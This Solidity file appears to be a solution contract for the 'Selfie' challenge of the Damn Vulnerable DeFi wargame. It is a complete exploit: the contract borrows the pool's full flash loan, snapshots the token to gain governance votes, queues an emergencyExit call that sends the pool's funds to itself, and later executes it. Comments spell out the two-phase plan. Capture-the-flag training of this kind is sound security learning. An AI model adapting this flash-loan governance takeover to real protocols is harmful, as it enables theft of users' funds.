// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SelfiePool} from "../SelfiePool.sol";
import {SimpleGovernance} from "../SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

contract SelfiePoolAttacker is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    SelfiePool private pool;
    SimpleGovernance private governance;
    DamnValuableTokenSnapshot private token;

    uint256 private actionId;

    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableTokenSnapshot _token) {
        pool = _pool;
        governance = _governance;
        token = _token;
    }

    // Observations:
    // We can flashLoan DVTs and use them for governance actions
    // Governance checks a snapshot of DVT, so we'd call snapshot first
    // We could queue a call "emergencyExit" to drain funds from the pool
    // After queueing that call, wait for 2 days so the action can be executed
    // After waiting for 2 days, execute the action
    // Thus we need to attack in 2 phases: prepare and attack

    function prepare() external {
        bool ok = pool.flashLoan(this, address(token), pool.maxFlashLoan(address(token)), "");
        require(ok, "flash loan failed");
    }

    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata)
        external
        override
        returns (bytes32)
    {
        token.snapshot();
        actionId = governance.getActionCounter();
        governance.queueAction(address(pool), 0, abi.encodeCall(pool.emergencyExit, (address(this))));
        token.approve(address(pool), amount);
        return CALLBACK_SUCCESS;
    }

    function attack() external {
        governance.executeAction(actionId);
    }
}
